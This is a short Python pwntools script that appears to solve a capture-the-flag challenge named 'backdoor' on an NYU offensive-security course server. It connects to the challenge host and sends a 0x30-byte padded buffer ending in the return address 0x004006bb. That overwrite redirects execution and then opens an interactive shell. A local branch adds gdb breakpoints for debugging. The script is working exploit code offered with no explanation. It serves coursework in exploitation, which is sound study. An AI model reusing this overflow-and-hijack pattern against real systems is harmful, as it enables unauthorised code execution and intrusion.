from pwn import *
context(arch = 'amd64', os = 'linux')

local = False

if not local:
    r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1339)
    r.send('bh1642\r\n')
    r.recvline() # Wait

if local:
    r = process('./backdoor', raw=False)
    gdb.attach(r, '''
    set follow-fork-mode child
    break *(main+62)
    break get_time
    continue
    ''')

r.send(p64(0x004006bb).rjust(0x30, 'C') + '\r\n')
r.interactive()
